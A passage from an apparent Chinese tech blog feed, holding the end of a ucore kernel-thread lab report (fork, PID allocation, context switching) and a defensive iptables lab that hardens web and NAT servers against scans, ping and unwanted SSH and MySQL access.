class="comment">//返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//    3. call copy_mm to dup OR share mm according clone_flag</span></span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>) &#123;<span class="comment">//复制父进程的内存信息到子进程</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;<span class="comment">//返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//    4. call copy_thread to setup tf &amp; context in proc_struct</span></span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf);<span class="comment">//复制父进程的中断帧和上下文信息</span></span><br><span class="line">    <span class="comment">//    5. insert proc_struct into hash_list &amp;&amp; proc_list</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag); <span class="comment">//屏蔽中断 intr_flag置为1</span></span><br><span class="line">    proc-&gt;pid = get_pid();<span class="comment">//获取当前进程PID</span></span><br><span class="line">    list_add(&amp;proc_list, &amp;proc-&gt;list_link);<span class="comment">//加入进程链表</span></span><br><span class="line">    hash_proc(proc);<span class="comment">//将新进程添加到进程的（hash）列表中</span></span><br><span class="line">    ++nr_process;<span class="comment">//进程数加1</span></span><br><span class="line">    local_intr_restore(intr_flag);<span class="comment">//恢复中断</span></span><br><span class="line">    <span class="comment">//    6. call wakeup_proc to make the new child process RUNNABLE</span></span><br><span class="line">    wakeup_proc(proc);<span class="comment">//唤醒子进程</span></span><br><span class="line">    <span class="comment">//    7. set ret vaule using child proc's pid</span></span><br><span class="line">    ret = proc-&gt;pid;<span class="comment">//返回子进程的pid</span></span><br><span class="line">    </span><br><span class="line">fork_out:<span class="comment">//已分配进程数大于4096</span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:<span class="comment">//分配内核栈失败</span></span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="回答问题-1"><a href="#回答问题-1" class="headerlink" title="回答问题"></a>回答问题</h3><blockquote>
<p>请说明ucore是否做到给每个新fork的线程一个唯一的id？请说明你的分析和理由。</p>
</blockquote>
<p>查看get_pid函数，了解PID的生成方法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// get_pid - alloc a unique pid for process</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">get_pid(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(MAX_PID &gt; MAX_PROCESS);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *<span class="built_in">list</span> = &amp;proc_list, *le;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> next_safe = MAX_PID, last_pid = MAX_PID;</span><br><span class="line">    <span class="keyword">if</span> (++ last_pid &gt;= MAX_PID) &#123;</span><br><span class="line">        last_pid = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> inside;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (last_pid &gt;= next_safe) &#123;</span><br><span class="line">    inside:</span><br><span class="line">        next_safe = MAX_PID;</span><br><span class="line">    repeat:</span><br><span class="line">        le = <span class="built_in">list</span>;</span><br><span class="line">        <span class="keyword">while</span> ((le = list_next(le)) != <span class="built_in">list</span>) &#123;</span><br><span class="line">            proc = le2proc(le, list_link);</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;pid == last_pid) &#123;</span><br><span class="line">                <span class="keyword">if</span> (++ last_pid &gt;= next_safe) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (last_pid &gt;= MAX_PID) &#123;</span><br><span class="line">                        last_pid = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    next_safe = MAX_PID;</span><br><span class="line">                    <span class="keyword">goto</span> repeat;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (proc-&gt;pid &gt; last_pid &amp;&amp; next_safe &gt; proc-&gt;pid) &#123;</span><br><span class="line">                next_safe = proc-&gt;pid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> last_pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/50bc1597/image-20200421164903167.png" alt="image-20200421164903167" style="zoom: 67%;"></p>
<p>从上可知</p>
<ul>
<li>在该函数中使用了两个变量next_dafe和last_pid，在初次进入函数时，若next_safe &gt; last_pid + 1，(last_pid，next_safe)的区间取值均是合法pid，如果满足条件，可直接返回last_pid + 1作为新的pid</li>
<li><p>否则，进入循环，在循环之中首先通过<code>if (proc-&gt;pid == last_pid)</code>这一分支确保了不存在任何进程的pid与last_pid重合，然后再通过<code>if (proc-&gt;pid &gt; last_pid &amp;&amp; next_safe &gt; proc-&gt;pid)</code>这一判断语句保证了不存在任何已经存在的pid满足：last_pid&lt;pid&lt;next_safe，这样就确保了最后能够找到这么一个满足条件的区间，获得合法的pid；</p>
</li>
<li><p>之所以在该函数中使用了如此曲折的方法，维护一个合法的pid的区间，是为了优化时间效率，如果简单的暴力的话，每次需要枚举所有的pid，并且遍历所有的线程，这就使得时间代价过大，并且不同的调用get_pid函数的时候不能利用到先前调用这个函数的中间结果</p>
</li>
</ul>
<p>因此可以给每个新fork的线程一个唯一的id</p>
<h2 id="练习3：阅读代码，理解-proc-run-函数和它调用的函数如何完成进程切换的。"><a href="#练习3：阅读代码，理解-proc-run-函数和它调用的函数如何完成进程切换的。" class="headerlink" title="练习3：阅读代码，理解 proc_run 函数和它调用的函数如何完成进程切换的。"></a>练习3：阅读代码，理解 proc_run 函数和它调用的函数如何完成进程切换的。</h2><p>请在实验报告中简要说明你对proc_run函数的分析。并回答如下问题：</p>
<ul>
<li>在本实验的执行过程中，创建且运行了几个内核线程？</li>
<li>语句<code>local_intr_save(intr_flag);....local_intr_restore(intr_flag);</code>在这里有何作用?请说明理由</li>
</ul>
<h3 id="实验过程-2"><a href="#实验过程-2" class="headerlink" title="实验过程"></a>实验过程</h3><p>查看proc_run函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// proc_run - make process "proc" running on cpu</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> before call switch_to, should load  base addr of "proc"'s new PDT</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">proc_run(struct proc_struct *proc) &#123;</span><br><span class="line">    <span class="keyword">if</span> (proc != current) &#123; <span class="comment">// 判断需要运行的线程是否已经运行着了</span></span><br><span class="line">        <span class="keyword">bool</span> intr_flag;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">prev</span> = <span class="title">current</span>, *<span class="title">next</span> = <span class="title">proc</span>;</span></span><br><span class="line">        local_intr_save(intr_flag); <span class="comment">//屏蔽中断 intr_flag置为1</span></span><br><span class="line">        &#123;</span><br><span class="line">            current = proc; </span><br><span class="line">            load_esp0(next-&gt;kstack + KSTACKSIZE); <span class="comment">// 设置TSS</span></span><br><span class="line">            lcr3(next-&gt;cr3); <span class="comment">// 修改当前的cr3寄存器成需要运行线程（进程）的页目录表</span></span><br><span class="line">            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context)); <span class="comment">// 切换到新的线程</span></span><br><span class="line">        &#125;</span><br><span class="line">        local_intr_restore(intr_flag);<span class="comment">//恢复中断</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>1、让 current指向 next内核线程initproc；</p>
<p>2、设置任务状态ts中特权态0下的栈顶指针esp0 为 next 内核线程 initproc 的内核栈的栈顶，即 next-&gt;kstack + KSTACKSIZE ；</p>
<p>3、设置 CR3 寄存器的值为 next 内核线程 initproc 的页目录表起始地址 next-&gt;cr3，这实际上是完成进程间的页表切换；</p>
<p>4、由 switch_to函数完成具体的两个线程的执行现场切换，即切换各个寄存器，当 switch_to 函数执行完“ret”指令后，就切换到initproc执行了。</p>
<p>运行代码，输入<code>make qemu</code></p>
<p><img src="/images/loading.gif" data-original="/posts/50bc1597/image-20200421181044250.png" alt="image-20200421181044250"></p>
<p><img src="/images/loading.gif" data-original="/posts/50bc1597/image-20200421181204092.png" alt="image-20200421181204092"></p>
<h3 id="回答问题-2"><a href="#回答问题-2" class="headerlink" title="回答问题"></a>回答问题</h3><blockquote>
<p>在本实验的执行过程中，创建且运行了几个内核线程？</p>
</blockquote>
<p><img src="/images/loading.gif" data-original="/posts/50bc1597/image-20200421191240247.png" alt="image-20200421191240247"></p>
<p>查看proc_init函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// proc_init - set up the first kernel thread idleproc "idle" by itself and</span></span><br><span class="line"><span class="comment">//           - create the second kernel thread init_main</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">proc_init(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    list_init(&amp;proc_list);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; HASH_LIST_SIZE; i ++) &#123;</span><br><span class="line">        list_init(hash_list + i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((idleproc = alloc_proc()) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        panic(<span class="string">"cannot alloc idleproc.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    idleproc-&gt;pid = <span class="number">0</span>;</span><br><span class="line">    idleproc-&gt;state = PROC_RUNNABLE;</span><br><span class="line">    idleproc-&gt;kstack = (<span class="keyword">uintptr_t</span>)bootstack;</span><br><span class="line">    idleproc-&gt;need_resched = <span class="number">1</span>;</span><br><span class="line">    set_proc_name(idleproc, <span class="string">"idle"</span>);</span><br><span class="line">    nr_process ++;</span><br><span class="line"></span><br><span class="line">    current = idleproc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pid = kernel_thread(init_main, <span class="string">"Hello world!!"</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (pid &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        panic(<span class="string">"create init_main failed.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    initproc = find_proc(pid);</span><br><span class="line">    set_proc_name(initproc, <span class="string">"init"</span>);</span><br><span class="line"></span><br><span class="line">    assert(idleproc != <span class="literal">NULL</span> &amp;&amp; idleproc-&gt;pid == <span class="number">0</span>);</span><br><span class="line">    assert(initproc != <span class="literal">NULL</span> &amp;&amp; initproc-&gt;pid == <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>从代码可知，有</p>
<ul>
<li>idle_proc，为第 0 个内核线程，在完成新的内核线程的创建以及各种初始化工作之后，进入死循环，用于调度其他进程或线程；</li>
<li>init_proc，被创建用于打印 “Hello World” 的线程。本次实验的内核线程，只用来打印字符串。</li>
</ul>
<blockquote>
<p>语句<code>local_intr_save(intr_flag);....local_intr_restore(intr_flag);</code>在这里有何作用?请说明理由</p>
</blockquote>
<p>在进行进程切换的时候，需要避免出现中断干扰这个过程，所以需要在上下文切换期间清除 IF 位屏蔽中断，并且在进程恢复执行后恢复 IF 位。</p>
<ul>
<li>该语句是屏蔽中断操作，使得在这个语句块内的内容不会被其他中断打断，是一个<strong>原子操作</strong></li>
<li>这就使得某些关键的代码不会被打断，从而不会一起不必要的错误</li>
<li>例如在 proc_run 函数中，将 current 指向了要切换到的线程，但是此时还未真正将控制权转移过去，若此时出现其他中断打断这些操作，便会出现 current 中保存的并不是正在运行的线程的中断控制块，从而出现错误</li>
</ul>
<h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><p>​         本次实验是关于内核线程的相关实验，实验涉及进程控制块的设计、内核线程分配问题，任务量较小，但是分析代码仍然是一件令人头疼的事情，get_pid函数中用到的多个跳转和循环使得代码难以理解。对于实验中出现的各种错误，还是得耐心debug…</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables之服务器应急响应及提供服务器防御解决方案实验</title>
    <url>/posts/2f12bf9c/</url>
    <content><![CDATA[<h1 id="【实验目的】"><a href="#【实验目的】" class="headerlink" title="【实验目的】"></a>【实验目的】</h1><p>参考实验场景及实验步骤完成服务器应急响应工作并重新为服务器部署策略。</p>
<a id="more"></a>
<h1 id="【知识点】"><a href="#【知识点】" class="headerlink" title="【知识点】"></a>【知识点】</h1><p>iptables使用</p>
<h1 id="【实验场景】"><a href="#【实验场景】" class="headerlink" title="【实验场景】"></a>【实验场景】</h1><p>某公司今天凌晨，运维中心收到警报，公司两台服务器（<strong>NAT</strong>服务器、<strong>Web</strong>服务器）<strong>cpu</strong>飙升。现你收到通知，需要你第一时间为这两台服务器进行应急处理。处理包括：<strong>1.</strong>解决服务器<strong>CPU</strong>飙升的情况；<strong>2.</strong>重新为服务器部署策略防止此类事情再次发生。</p>
<h1 id="【实验原理】"><a href="#【实验原理】" class="headerlink" title="【实验原理】"></a>【实验原理】</h1><p>iptables防火墙工作在网络层，针对TCP/IP数据包实施过滤和限制，iptables防火墙基于内核编码实现，具有非常稳定的性能和高效率；iptables属于“用户态”的防火墙管理体系。规则（rules）其实就是网络管理员预定义的条件，规则一般的定义为“如果数据包头符合这样的条件，就这样处理这个数据包”。规则存储在内核空间的信息包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包与规则匹配时，<strong>iptables</strong>就根据规则所定义的方法来处理这些数据包，如放行（<strong>accept</strong>）、拒绝（<strong>reject</strong>）和丢弃（<strong>drop</strong>）等。配置防火墙的主要工作就是添加、修改和删除这些规则。</p>
<h1 id="【实验设备】"><a href="#【实验设备】" class="headerlink" title="【实验设备】"></a>【实验设备】</h1><p>主机终端：<strong>Windows 7</strong>主机 <strong>* 1</strong>台，<strong>RedHat 7</strong> 服务器 <strong>*2</strong>台，<strong>RedHat 7</strong> 主机 <strong>*1</strong>台</p>
<h1 id="【实验拓扑】"><a href="#【实验拓扑】" class="headerlink" title="【实验拓扑】"></a>【实验拓扑】</h1><p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414231015217.png" alt="image-20200414231015217"></p>
<h1 id="【实验思路】"><a href="#【实验思路】" class="headerlink" title="【实验思路】"></a>【实验思路】</h1><p>1、在Web服务器上查看当前iptables规则。</p>
<p>2、在Web服务器上增加iptables防火墙配置，禁止攻击源IP（Windows攻击机的IP地址）对该服务器的所有流量，然后查看iptables规则。</p>
<p>3、在Web服务器上配置loopback回环通信。</p>
<p>4、在Web服务器上增加iptables规则，禁止对该主机进行nmap扫描，然后查看下iptables规则。</p>
<p>5、在Web服务器上设置禁止ICMP协议。</p>
<p>6、在NAT服务器中增加部署iptables NAT代理，配置Web服务器只允许内网Linux客户端访问和通过代理服务器访问，并查看<strong>iptables</strong>规则。</p>
<p>7、验证：登录Windows攻击机，打开浏览器访问Web服务器，可以看到配置策略后攻击源无法再次访问。</p>
<p>8、验证：在Windows攻击机上使用nmap扫描Web服务器，可以看到配置禁止nmap扫描策略后扫描失败。 </p>
<p>9、验证：在Windows攻击机上对Web服务器ip进行ping操作，发现配置禁止ICMP策略后无法ping通。</p>
<p>10、验证：打开Linux客户端测试访问Web服务器，可以正常访问。</p>
<p>11、验证：打开NAT服务器测试访问Web服务器，可以正常访问。</p>
<p>12、打开NAT服务器进行配置，先将防火墙进行初始化，然后将Web服务器默认的80端口映射到NAT服务器的8080端口。</p>
<p>13、在NAT服务器上开启转发功能，查看NAT表所有链的规则。</p>
<p>14、验证：登录Windows攻击机打开浏览器，配置好策略后通过代理访问，可以成功访问。</p>
<p>15、分别在每台服务器（Web服务器、NAT服务器）中配置ssh只对Linux客户端开放，除Linux客户端IP外其他IP不允许对其ssh访问。</p>
<p>16、验证：在Windows攻击机中利用工具分别对Web服务器和NAT进行ssh连接，连接失败。</p>
<p>17、验证：在Linux客户端中分别对Web服务器和NAT进行ssh连接，连接成功。</p>
<p>18、在Web服务器上配置策略屏蔽3306端口，只允许本机访问。</p>
<p>19、验证：在Linux客户端中访问Web服务器mysql服务，访问失败。</p>
<p>20、验证：在Web服务器中访问mysql服务，访问成功。</p>
<p>21、打开NAT服务器，增加iptables规则，禁止对该主机进行nmap扫描。 </p>
<p>22、验证：在Windows攻击机中使用nmap扫描NAT服务器，扫描失败。</p>
<h1 id="【实验预期】"><a href="#【实验预期】" class="headerlink" title="【实验预期】"></a>【实验预期】</h1><p>1、在Windows攻击机中打开浏览器访问Web服务器，配置好策略后攻击源无法访问。</p>
<p>2、在Windows攻击机上使用nmap扫描Web服务器，配置好策略后扫描失败。</p>
<p>3、在Windows攻击机上对Web服务器ip进行ping操作，配置好策略后无法ping通。 </p>
<p>4、分别打开Linux客户端和NAT服务器测试访问Web服务器，可以正常访问。</p>
<p>5、在Windows攻击机中打开浏览器，配置好策略后通过代理访问，可以成功访问。</p>
<p>6、在Windows攻击机中利用工具分别对Web服务器和NAT进行ssh连接，均连接失败。</p>
<p>7、在Linux客户端中分别对Web服务器和NAT进行ssh连接，连接成功。 </p>
<p>8、在Linux客户端中访问Web服务器mysql服务，访问失败。</p>
<p>9、在Web服务器中访问mysql服务，访问成功。</p>
<p>10、在Windows攻击机中使用nmap扫描NAT服务器，扫描失败。</p>
<h1 id="【实验结果】"><a href="#【实验结果】" class="headerlink" title="【实验结果】"></a>【实验结果】</h1><p>1、登录Windows攻击机，打开浏览器访问Web服务器，可以看到策略配置后攻击源无法再次访问。</p>
<p>2、在Windows攻击机上打开命令行界面使用命令：nmap 192.168.1.101（Web服务器IP）扫描Web服务器，可以看到配置禁止nmap扫描策略后扫描失败。</p>
<p>3、在Windows攻击机上对Web服务器ip使用ping命令：ping 192.168.1.101（Web服务器ip），发现配置禁止ICMP策略后无法<strong>ping</strong>通。</p>
<p>4、打开Linux客户端使用命令：curl 192.168.1.101，测试访问Web服务器，可以正常访问。</p>
<p>5、打开NAT服务器使用命令：curl 192.168.1.101，测试访问Web服务器，可以正常访问。</p>
<p>6、打开Windows攻击机，配置好策略后通过代理访问，访问成功。</p>
<p>7、登录Windows攻击机，打开实验工具里的PuTTY工具，分别输入192.168.1.101（Web服务器IP）和<strong>192.168.10.10</strong>（<strong>NAT</strong>服务器<strong>IP</strong>），点击【<strong>Open</strong>】，发现配置策略后<strong>Windows</strong>攻击机通过<strong>SSH</strong>无法连接<strong>Web</strong>服务器和<strong>NAT</strong>服务器。</p>
<p>8、登录Linux客户端，在终端中输入命令：ssh 192.168.1.101（Web服务器IP）登录成功，继续输入命令：exit登出，然后输入：ssh 192.168.10.10（NAT服务器IP）登陆成功。</p>
<p>9、打开Linux客户端，在终端中输入命令：mysql –uroot –h192.168.1.101 –p（192.168.1.101为Web服务器ip），连接失败。</p>
<p>10、打开Web服务器，在终端中输入命令：mysql –uroot –p，连接成功。</p>
<p>11、在Windows攻击机上，打开命令行界面，输入命令：nmap -A 192.168.10.10（NAT服务器IP），扫描NAT服务器，扫描失败。</p>
<h1 id="【实验步骤】"><a href="#【实验步骤】" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h1><p>1、在Web服务器中打开终端，root用户下输入命令：<code>iptables –L</code>，查看当前iptables规则。如图所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200408220456980.png" alt="image-20200408220456980"></p>
<p>2、增加iptables防火墙配置，禁止攻击源IP（Windows攻击机的IP地址）对该服务器的所有流量,使用的命令是：<code>iptables -I INPUT –s 192.168.20.20 -j DROP</code>。其中192.168.20.20是Windows攻击机的IP地址，配置好后使用命令<code>iptables -L</code>查看当前所有iptables配置。如图所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200408221422123.png" alt="image-20200408221422123"></p>
<p>图 <strong>2:</strong> 配置并查看<strong>iptables</strong>规则</p>
<p>3、在Web服务器上配置loopback回环通信，输入命令：</p>
<p><code>iptables -A INPUT -i lo -p all -j ACCEPT</code> //添加iptables规则,允许来自于lo接口的数据包。</p>
<p><code>iptables -A OUTPUT -o lo -p all -j ACCEPT</code>//添加iptables规则,允许向lo接口发送数据包。</p>
<p>其中lo为回环网卡</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200409003640625.png" alt="image-20200409003640625"></p>
<p>4、在web服务器上增加iptables规则，禁止对该主机进行nmap扫描，配置完后用iptables-L查看下iptables规则。输入命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP</span><br><span class="line">iptables -I INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP </span><br><span class="line">iptables -I INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP</span><br></pre></td></tr></table></figure></div>
<p><code>iptables -L</code></p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200409005219308.png" alt="image-20200409005219308"></p>
<p>5、在Web服务器上设置禁止ICMP协议，输入命令：</p>
<p><code>iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</code>。配置完成后查看一下</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200409005505546.png" alt="image-20200409005505546"></p>
<p>6、在Web服务器中部署iptables NAT代理，配置Web服务器只允许内网Linux客户端访问和通过代理服务器访问，并查看iptables规则（192.168.1.102为Linux客户端IP，192.168.10.10为NAT服务器IP）。如图6所示：</p>
<p>输入命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 192.168.1.102 -p tcp --dport 80 -j ACCEPT </span><br><span class="line">iptables -A INPUT -s 192.168.10.10 -p tcp --dport 80 -j ACCEPT </span><br><span class="line">iptables -A INPUT -p TCP --dport 80 -j REJECT</span><br><span class="line">iptables -L</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200409010610999.png" alt="image-20200409010610999"></p>
<p>7、验证：登录Windows攻击机，打开浏览器访问Web服务器，可以看到策略配置后攻击源无法再次访问。</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200408224735446.png" alt="image-20200408224735446"></p>
<p>8、验证：在Windows攻击机上打开命令行界面使用命令：nmap 192.168.1.101（Web服务器IP）扫描Web服务器，可以</p>
<p>看到配置禁止<strong>nmap</strong>扫描策略后扫描失败。如图所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200408225450155.png" alt="image-20200408225450155"></p>
<p>9、验证：在Windows攻击机上对Web服务器ip使用ping命令：ping 192.168.1.101（Web服务器ip），发现配置禁止ICMP策略后无法ping通。</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200408225559823.png" alt="image-20200408225559823"></p>
<p>10、验证：打开Linux客户端使用命令：curl 192.168.1.101，测试访问Web服务器，可以正常访问。如图所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414115519467.png" alt="image-20200414115519467"></p>
<p>11、验证：打开NAT服务器使用命令：curl 192.168.1.101，测试访问Web服务器，可以正常访问。如图所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414115447825.png" alt="image-20200414115447825"></p>
<p>12、打开NAT服务器进行配置，先将防火墙进行初始化，然后再将Web服务器默认的80端口映射到NAT服务器的8080端口。（192.168.1.101为Web服务器ip，192.168.10.10为NAT服务器ip）</p>
<p>输入命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">iptables -F //清除所有规则，不会处理默认的规则</span><br><span class="line">iptables -X //删除用户自定义的链</span><br><span class="line">iptables -Z //链的计数器清零（数据包计数器与数据包字节计数器）</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.101:80 </span><br><span class="line">iptables -t nat -A POSTROUTING -d 192.168.1.101 -p tcp --dport 80 -j SNAT --to 192.168.10.10</span><br><span class="line">//通过访问NAT代理服务器的8080端口来实现到Web服务器内网地址的80端口的访问</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward //开启转发功能</span><br><span class="line"></span><br><span class="line">iptables -t nat –L //查看NAT表所有链的规则</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414121734541.png" alt="image-20200414121734541"></p>
<p>13、验证：打开Windows攻击机，配置好策略后通过代理访问（地址栏ip改为NAT代理服务器ip和端口：192.168.10.10:8080），访问成功。如图12所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414135144020.png" alt="image-20200414135144020"></p>
<p>14、打开Web服务器配置ssh只对Linux客户端开放，除Linux客户端IP（192.168.1.102）外其他IP不允许对其ssh访问。输入命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 192.168.1.102 -p tcp -m tcp --dport 22 -j ACCEPT//接受Linux客户端IP的访问 </span><br><span class="line">iptables -A INPUT -p tcp -m tcp --dport 22 -j DROP //其他IP的访问包丢弃</span><br></pre></td></tr></table></figure></div>
<p>15、打开NAT服务器配置ssh只对Linux客户端开放，除Linux客户端IP（192.168.1.102）外其他IP不允许对其ssh访问。输入命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 192.168.1.102 -p tcp -m tcp --dport 22 -j ACCEPT//接受Linux客户端IP的访问 </span><br><span class="line">iptables -A INPUT -p tcp -m tcp --dport 22 -j DROP //其他IP的访问包丢弃</span><br></pre></td></tr></table></figure></div>
<p>16、验证：登录Windows攻击机，打开实验工具里的PuTTY工具，在【Host Name】输入框中分别输</p>
<p>入<strong>192.168.1.101</strong>（<strong>Web</strong>服务器<strong>IP</strong>）和<strong>192.168.10.10</strong>（<strong>NAT</strong>服务器<strong>IP</strong>），点击【<strong>Open</strong>】进行连接，发现配置策略后<strong>Windows</strong>攻击机通过<strong>SSH</strong>无法连接<strong>Web</strong>服务器和<strong>NAT</strong>服务器。如图<strong>16</strong>所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414141002503.png" alt="image-20200414141002503"></p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414141130254.png" alt="image-20200414141130254"></p>
<p>17、验证：登录Linux客户端，在终端中输入命令：ssh 192.168.1.101（Web服务器IP），登录成功，继续输入命令：exit登出，然后输入：ssh 192.168.10.10（NAT服务器IP）登陆成功，密码均为123456，如图17所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414141511964.png" alt="image-20200414141511964"></p>
<p>18、在Web服务器上配置策略屏蔽3306端口，只允许本机访问。打开Web服务器，在终端中输入命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 192.168.1.101 -p tcp --dport 3306 -j ACCEPT </span><br><span class="line">iptables -A OUTPUT -d 192.168.1.101 -p tcp --sport 3306 -j ACCEPT </span><br><span class="line">iptables -A INPUT -p tcp --dport 3306 -j DROP</span><br><span class="line">//屏蔽3306端口</span><br></pre></td></tr></table></figure></div>
<p>19、验证：打开Linux客户端，在终端中输入命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">mysql –uroot –h 192.168.1.101 –p</span><br></pre></td></tr></table></figure></div>
<p>（192.168.1.101为Web服务器ip，密码为123456），连接失败。</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414142548791.png" alt="image-20200414142548791"></p>
